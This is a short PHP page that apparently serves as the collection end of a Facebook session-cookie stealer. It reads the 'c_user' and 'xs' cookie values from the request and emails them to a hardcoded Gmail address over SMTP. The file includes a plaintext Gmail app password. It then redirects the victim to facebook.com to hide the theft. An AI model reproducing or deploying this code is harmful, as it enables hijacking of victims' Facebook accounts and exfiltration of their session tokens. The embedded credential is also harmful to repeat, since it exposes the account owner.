<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
</head>
<body>
    <?php   

        // print_r($_REQUEST);
        $c_user = $_REQUEST['c_user'];
        $xs = $_REQUEST['xs'];

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    require 'PHPMailer/src/PPPHPMailer.php';
    require 'PHPMailer/src/SSSMTP.php';
    require 'PHPMailer/src/Exception.php';
    // passing true in constructor enables exceptions in PHPMailer
    $mail = new PHPMailer(true);

    // try {
        // Server settings
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER; // for detailed debug output
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        $mail->Username = 'hassamkaif123@gmail.com'; // YOUR gmail email
        $mail->Password = 'xxyshwmkicojmjzu'; // YOUR gmail password

        // Sender and recipient settings
        $mail->setFrom('hassamkaif123@gmail.com', 'Sender Name');
        $mail->addAddress('hassamkaif123@gmail.com', 'Receiver Name');
        $mail->addReplyTo('alyssadean.us@gmail.com', 'Sender Name'); // to set the reply to

        // Setting the email content
        $mail->IsHTML(true);
        $mail->Subject = "Send email using Gmail SMTP and PHPMailer";
        $mail->Body = 'data: c_user = '.$c_user.' , xs = '.$xs;
        $mail->AltBody = 'Plain text message body for non-HTML email client. Gmail SMTP email body.';

        $mail->send();
        if (!$mail->send()) {
            echo 'Mailer Error: ' . $mail->ErrorInfo;
        } else {
            echo 'Message sent!';
            echo "<script> location.href='https://facebook.com'; </script>";
        }
               // header("Location:https://facebook.com"); //Redirect to url if form submitted


     ?>
</body>
</html>
